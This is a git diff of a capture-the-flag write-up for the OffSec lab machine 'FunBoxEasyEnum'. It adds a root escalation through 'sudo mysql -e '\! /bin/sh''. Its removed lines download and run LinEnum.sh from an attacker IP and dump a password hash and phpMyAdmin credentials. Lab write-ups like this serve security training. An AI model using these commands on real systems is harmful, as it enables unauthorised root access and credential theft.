@@ -2,7 +2,7 @@
 title: "Offsec - PG Play - FunBoxEasyEnum"
 date: 2025-10-24 12:00:00 -0700
 categories: [CTF,Offsec]
-tags: [Linux, phpmyadmin ]
+tags: [Linux, webapp discovery, webshell, bruteforce, NOPASSWD, GTFOBins ]
 ---
 
 ![Markup](/assets/img/ctf/htb/very-easy/markup/1.png)
@@ -319,36 +319,38 @@ Password:
 harry@funbox7:/home/goat$ 
 ```
 
+User *harry* may be a rabbit hole. I'll rexamine *goat* further.
 
 ## Root / SYSTEM
 
-```bash
-harry@funbox7:~$ wget http://192.168.45.209:8000/lin/LinEnum.sh
-           
-harry@funbox7:~$ chmod +x LinEnum.sh                                                                                                                                                                                     
-harry@funbox7:~$ bash -i LinEnum.sh 
-                                                                                                                                                                                                              
-[+] It looks like we have password hashes in /etc/passwd!                                                                                                                                                                
-oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash    
-```
-
-
+I decided to go back and rexamine the sudo command with *NOPASSWD*. 
 
 ```bash
-www-data@funbox7:/$ cat /etc/phpmyadmin/config-db.php
+goat@funbox7:/$ sudo -l
+sudo -l
+Matching Defaults entries for goat on funbox7:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-$dbuser='phpmyadmin';
-$dbpass='tgbzhnujm!';
-$basepath='';
-$dbname='phpmyadmin';
-$dbserver='localhost';
-$dbport='3306';
-$dbtype='mysql';
+User goat may run the following commands on funbox7:
+    (root) NOPASSWD: /usr/bin/mysql
 ```
 
+*GTFOBins* is a resource I've heard constantly praised by my seniors in the community, but I haven't readily adopted yet. This turns out to have been a mistake; GTFOBins lists a method to get a shell at root with the sudo permission!
+
+[GTFOBins mysql sudo shell](https://gtfobins.github.io/gtfobins/mysql/#sudo)
+
+```bash
+goat@funbox7:/$ sudo mysql -e '\! /bin/sh'
+sudo mysql -e '\! /bin/sh'
+# whoami
+whoami
+root
+```
+
+FunboxEasyEnum has been rooted.
 
 # Lessons Learned
-* XML can lead to XXE / XEE, which can lead to LFI
-* Enumerate odd directories. If we see custom .bat or .exe files, check permissions to see if we can edit the file
-* Even if we can't see a process since it may be running as admin, context may provide clues it is scheduled to run as admin
-* when edit files with piped input, cmd is preffered over Powershell
+* Rabit holes are a PITA. Use a timer to avoid staying in one for too long
+* When trying to bruteforce an account's password, always try the username as the password first
+* GTFOBins is an invaluable resource when potentially exploiting bins
